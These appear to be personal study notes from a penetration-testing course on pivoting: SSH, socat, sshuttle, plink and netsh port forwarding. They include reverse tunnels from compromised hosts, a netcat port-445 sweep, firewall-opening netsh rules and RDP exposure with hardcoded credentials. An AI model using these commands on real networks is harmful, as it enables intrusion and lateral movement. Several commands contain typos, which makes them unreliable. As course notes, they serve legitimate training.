## Section 2 Port Forwarding With Linux Tools 
### 18.2.3 Port Forwarding With Socat
- Example of a socat tunnel
```
socat -ddd TCP-LISTEN:2345;fork TCP:<TARGETIP>:5432(INTERNAL INFO)
```

## Section 3 SSH Tunneling
### 18.3.1 SSH Local Port Forwarding
- Upgrade a shell if it has python with 
```
python3 -c 'import pty;pty.spawn("/bin/bash")'
```
- The following is a bash for loop to sweep for hosts with an open port 445 on a /24 subnet
```
for i in $(seq 1 254); do nc -zv -w 1 IP.$i 445; done
```
- SSH local port forward is executed on the target machine 
	- The first address is the listening socket that will be bound to the ssh client machine 
	- The second is where we want to forward the packets to
	- Example on the WAN device run
```
ssh -N -L 0.0.0.0:4455:<TARGET_IP>:445
```
- sshuttle forwarding 
```
sshttle pi@pi_ip TARGET_IP/24 
```
### 18.3.2 Dynamic Port Forwarding
- Dynamic port forward with 
```
ssh -N -D 0.0.0.0:9999 <TARGET_USER>@<TARGET_IP>
```
- THEN 
	- edit proxychains.conf 
	- THEN
		- run proxychains before your command
- On the pi run 
```
ssh -D 127.0.0.1:9052 pi@pi_ip
```
- Then
```
ssh -R 127.0.0.1:9051:127.0.0.1:9052 kali_username@kali_ip
```
- Run your commands on the target with proxychains prefix
### 18.3.3 Remote Port Forwarding
- ssh remote port forward option is -R and takes two arguments 
	- First is the listening socket then the forwarding socket
	- Example 
	- On target machine
```
ssh -N -R 127.0.0.1:2345:<TARGET_IP>:<TARGET_PORT> kali@<MY_IP>
```
- THEN example of a command after this is established with pgsql
```
psql -h 127.0.0.1 -p 2345 -U postgres
```
### 18.3.4 Remote Dynamic Port Forwarding
- In remote dynamic port forwarding you only pass one argument whic is the socket you want to listen to on the ssh server 
- Example 
```
ssh -N -R 9998 kali@<MY_IP>
```
- Example command from my machine 
```
proxychains nmap -vvv -sT --top-ports=20 -Pn -n <TARGET_IP>
```
### 18.3.5 Using sshuttle
- sshuttle requires root privileges and python3 on the server 
	- This essentially creates a vpn 
	- You use it by specifying the ssh connection you want to use as well as the subnets you want to tunnel through the connection like 
- On the target machine 
```
socat TCP-LISTEN:2222,fork TCP:<TARGET_IP>:<TARGET_PORT>
```
- On my machine
```
sshuttle -r <TARGET_USER?@<TARGET_IP>:<PORT> <TARGET_IP/CIDR (10.0.50.0/240) <OTHER_TARGET_IP/CIDR>
```
- Example command on my computer after this 
```
smbclient -L //<TARGET_IP>/ -U <USER_NAME> --password=<PASSWORD>
```
## Section 4 Port Forwarding with Windows Tools 
### 16.4.1 ssh.exe 
- xfreerdp one liner 
```
xfreerdp /u:<USER_NAME> /p:<PASSWORD> /v:<TARGET_IP>
```
- plink.exe is a cli putty but does not have remote dynamic port forwarding 
- plink one liner for rdp access
```
C:\Windows\Temp\plink,exe -ssh -l kali -pw kali -R 127.0.0.1:9833:127.0.0.1:3389 <TARGET_IP>
```
- On my machine run 
```
xfreerdp /u:<USER_NAME> /p:<PASSWORD> /v:127.0.0.1:9833
```
### 18.4.3 Netsh
- netsh one-liner for ssh tunneling
```
netsh interface portproxy ad v4tov4 listemport=2222 listenaddress=<COMPUTER_IP> connectport=<TARGET_PORT> connectaddress=TARGET_IP>
```
- Example command from my computer 
```
sudo nmap -sS <COMPUTER_IP> -Pn -n -p2222
```
- To poke a hole in the firewall to allow a connection with netsh the one-liner on the target machine is 
```
netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=<COMPUTER_IP> localport=2222 action=allow
```
- Delete the firewall rule with the following command 
```
netsh advfirewall delete rule name="port_forward_ssh_2222"
```
- Delete port proxy with netsh that was created with the following one-liner
```
netsh interface portproxy del v4tov4 listenport=2222 listenaddress=<COMPUTER_IP>
```
## Exercises To-Do

- [ ] 2.1.1 (page 20)